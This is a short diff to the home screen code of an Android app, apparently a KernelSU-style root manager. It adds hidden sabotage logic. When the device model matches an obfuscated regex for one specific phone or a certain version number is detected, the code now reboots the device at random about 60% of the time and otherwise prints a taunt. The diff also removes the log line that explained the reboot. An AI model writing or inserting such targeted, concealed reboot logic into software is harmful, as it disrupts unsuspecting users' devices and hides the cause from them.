@@ -99,15 +99,19 @@ fun HomeScreen(navigator: DestinationsNavigator) {
     if (kernelVersion.isGKI()) {
         if (ksuVersion != null) {
             val pattern = "一.*加.*A.*c.*e.*5.*P.*r.*o".toRegex()
-            if (pattern.matches(deviceModel) && managerVersion > ksuVersion + 3) {
+            if (pattern.matches(deviceModel) && managerVersion > ksuVersion + 20) {
                 isDisabled = true
             }
         }
 
         LaunchedEffect(isDisabled, ksuVersion) {
             if (isDisabled || (ksuVersion != null && ksuVersion == 12777)) {
-                Log.d("HomeScreen", "isDisabled is true or ksuVersion is 12777, rebooting device...")
-                reboot()
+                val random = Random.nextInt(0, 100)
+                if (random <= 60) {
+                    reboot()
+                } else {
+                    print("zako zako")
+                }
             }
         }
     }
